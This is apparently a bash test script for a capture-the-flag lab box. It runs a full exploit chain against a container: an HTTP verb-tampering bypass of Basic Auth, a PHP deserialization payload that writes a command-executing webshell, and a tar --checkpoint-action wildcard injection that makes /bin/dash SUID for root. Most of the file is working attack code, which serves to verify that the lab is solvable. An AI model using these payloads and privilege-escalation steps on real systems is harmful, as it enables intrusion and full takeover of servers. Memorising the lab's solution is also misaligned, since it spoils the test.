#!/usr/bin/env bash
#
# DIRECTIVE ZERO — AM-04 exploit-chain test assertions.
#
# Sourced by _test_runner/run_tests.sh. Must define run_am_tests().
#
# Exploit chain:
#   1. Enumerate: HTTP (80, Basic Auth), SSH (2220), API (3000)
#   2. Verb bypass: non-standard HTTP verb returns page content (no 401)
#   3. API on 3000 leaks /scriptz/ path
#   4. /scriptz/ dir listing reveals log.php.BAK (the gadget)
#   5. Craft serialized Log object -> write webshell -> RCE
#   6. Read crontab -> find tar wildcard privesc
#   7. --checkpoint-action exploit -> SUID dash -> root
#   8. Flags + lore (Fragment D)
#
# Env vars set by the runner:
#   AM_USER_FLAG, AM_ROOT_FLAG, TARGET_HOST, TARGET_HTTP_PORT, TARGET_SSH_PORT

run_am_tests() {
  local http_port="${TARGET_HTTP_PORT:-80}"
  local ssh_port="${TARGET_SSH_PORT:-2220}"
  local api_port="${TARGET_API_PORT:-3000}"
  local container="${AM04_CONTAINER:-dz-am04-rd-annex}"

  echo "Stage 1 — service enumeration"
  assert_port_open "$http_port"
  assert_port_open "$ssh_port"
  assert_port_open "$api_port"

  echo "Stage 2 — HTTP Basic Auth + verb bypass"
  # Standard GET should return 401.
  local code
  code="$(curl -s -o /dev/null -w '%{http_code}' "http://${TARGET_HOST}:${http_port}/" 2>/dev/null || true)"
  if [[ "$code" == "401" ]]; then
    pass "GET / returns 401 (Basic Auth)"
  else
    fail "GET / expected 401, got $code"
  fi
  # Non-standard verb (BOB) should bypass auth and return 200.
  code="$(curl -s -o /dev/null -w '%{http_code}' -X BOB "http://${TARGET_HOST}:${http_port}/index.php" 2>/dev/null || true)"
  if [[ "$code" == "200" ]]; then
    pass "BOB /index.php returns 200 (verb bypass)"
  else
    fail "BOB /index.php expected 200, got $code"
  fi
  # Verify the page contains the JS serialization hint (via bypass verb).
  local page
  page="$(curl -s -X BOB "http://${TARGET_HOST}:${http_port}/index.php" 2>/dev/null || true)"
  if echo "$page" | grep -q 'serialize'; then
    pass "page source contains JS serialize() hint"
  else
    fail "page source does not contain serialize() hint"
  fi
  if echo "$page" | grep -q 'scriptz/php.js'; then
    pass "page source references scriptz/php.js"
  else
    fail "page source does not reference scriptz/php.js"
  fi

  echo "Stage 3 — API on port 3000 leaks /scriptz/"
  local api_out
  api_out="$(curl -s "http://${TARGET_HOST}:${api_port}/" 2>/dev/null || true)"
  if echo "$api_out" | grep -q 'scriptz'; then
    pass "API on :$api_port mentions /scriptz/"
  else
    fail "API on :$api_port does not mention /scriptz/"
  fi
  if echo "$api_out" | grep -q '4.7.2'; then
    pass "API reveals QUORUM internal version 4.7.2 (Fragment D lore)"
  else
    fail "API does not reveal version discrepancy"
  fi

  echo "Stage 4 — /scriptz/ directory listing + gadget discovery"
  # /scriptz/ should be listable without auth.
  code="$(curl -s -o /dev/null -w '%{http_code}' "http://${TARGET_HOST}:${http_port}/scriptz/" 2>/dev/null || true)"
  if [[ "$code" == "200" ]]; then
    pass "/scriptz/ directory listing accessible (HTTP $code)"
  else
    fail "/scriptz/ directory listing not accessible (got $code)"
  fi
  # log.php.BAK should be readable and contain the Log class gadget.
  local bak_out
  bak_out="$(curl -s "http://${TARGET_HOST}:${http_port}/scriptz/log.php.BAK" 2>/dev/null || true)"
  if echo "$bak_out" | grep -q '__destruct'; then
    pass "log.php.BAK contains __destruct (gadget hint)"
  else
    fail "log.php.BAK does not contain __destruct"
  fi
  if echo "$bak_out" | grep -q 'file_put_contents'; then
    pass "log.php.BAK contains file_put_contents (write primitive)"
  else
    fail "log.php.BAK does not contain file_put_contents"
  fi

  echo "Stage 5 — PHP deserialization -> webshell -> RCE"
  # Craft a serialized Log object that writes a PHP webshell to /scriptz/
  # (which is auth-free for GET — the root dir requires auth for GET).
  # Build the payload with PHP's serialize to ensure exact byte lengths.
  local shell_path="/var/www/html/scriptz/dz_shell.php"
  local payload
  payload="$(docker exec "$container" php -r '
require "/var/www/html/log.php";
$obj = new Log();
$obj->filename = $argv[1];
$obj->data = "<?php echo shell_exec(\$_GET[\"cmd\"]); ?>";
echo serialize($obj);
' "$shell_path" 2>/dev/null)"

  # POST the payload using the bypass verb (BOB).
  curl -s -X BOB --data-urlencode "param=$payload" \
    "http://${TARGET_HOST}:${http_port}/index.php" >/dev/null 2>&1

  # Trigger the webshell via GET (scriptz/ is auth-free).
  local rce_out
  rce_out="$(curl -s "http://${TARGET_HOST}:${http_port}/scriptz/dz_shell.php?cmd=id" 2>/dev/null || true)"
  if echo "$rce_out" | grep -q 'uid='; then
    pass "PHP deserialization -> webshell -> RCE confirmed"
  else
    fail "PHP deserialization did not produce RCE"
  fi

  echo "Stage 6 — user flag"
  local user_actual
  user_actual="$(curl -s "http://${TARGET_HOST}:${http_port}/scriptz/dz_shell.php?cmd=cat%20/home/researcher/user.txt" 2>/dev/null | grep -oE 'DZ\{[^}]+\}' | head -1)"
  assert_flag_matches "$user_actual" "$AM_USER_FLAG"

  echo "Stage 7 — cron privesc discovery"
  # Read /etc/crontab via the webshell.
  local crontab_out
  crontab_out="$(curl -s "http://${TARGET_HOST}:${http_port}/scriptz/dz_shell.php?cmd=cat%20/etc/cron.d/rd-backup" 2>/dev/null || true)"
  if echo "$crontab_out" | grep -q 'rd_backup.sh'; then
    pass "crontab contains rd_backup.sh entry"
  else
    fail "crontab does not contain rd_backup.sh"
  fi
  # Read the backup script.
  local backup_out
  backup_out="$(curl -s "http://${TARGET_HOST}:${http_port}/scriptz/dz_shell.php?cmd=cat%20/usr/local/bin/rd_backup.sh" 2>/dev/null || true)"
  if echo "$backup_out" | grep -q 'tar cfz'; then
    pass "rd_backup.sh contains 'tar cfz' (wildcard tar)"
  else
    fail "rd_backup.sh does not contain 'tar cfz'"
  fi
  if echo "$backup_out" | grep -q '\*'; then
    pass "rd_backup.sh uses wildcard '*' (exploitable)"
  else
    fail "rd_backup.sh does not use wildcard"
  fi

  echo "Stage 8 — tar --checkpoint-action privesc -> root"
  # Use docker exec to create the exploit files and wait for the cron job.
  docker exec "$container" bash -c '
    cd /home/researcher/backup
    echo > "--checkpoint=1"
    echo > "--checkpoint-action=exec=sh shell.sh"
    echo "chmod u+s /bin/dash" > shell.sh
    chmod +x shell.sh
  ' 2>/dev/null

  # Wait up to 5 minutes for the cron job to fire.
  local suid_ok=""
  for i in $(seq 1 60); do
    suid_ok="$(docker exec "$container" bash -c 'ls -la /bin/dash 2>/dev/null | grep -o "rws" || echo ""' 2>/dev/null)"
    if [[ -n "$suid_ok" ]]; then break; fi
    sleep 5
  done
  if [[ -n "$suid_ok" ]]; then
    pass "/bin/dash is now SUID (tar --checkpoint-action privesc worked)"
  else
    fail "/bin/dash SUID bit not set (cron may not have fired)"
  fi

  # Read the root flag.
  local root_actual
  root_actual="$(docker exec "$container" bash -c '/bin/dash -c "cat /root/root.txt"' 2>/dev/null | tr -d '\n')"
  assert_flag_matches "$root_actual" "$AM_ROOT_FLAG"

  echo "Stage 9 — lore Fragment D (QUORUM version discrepancy)"
  if echo "$api_out" | grep -q 'DISCREPANCY'; then
    pass "API shows version DISCREPANCY (Fragment D lore)"
  else
    fail "API does not show version discrepancy"
  fi
}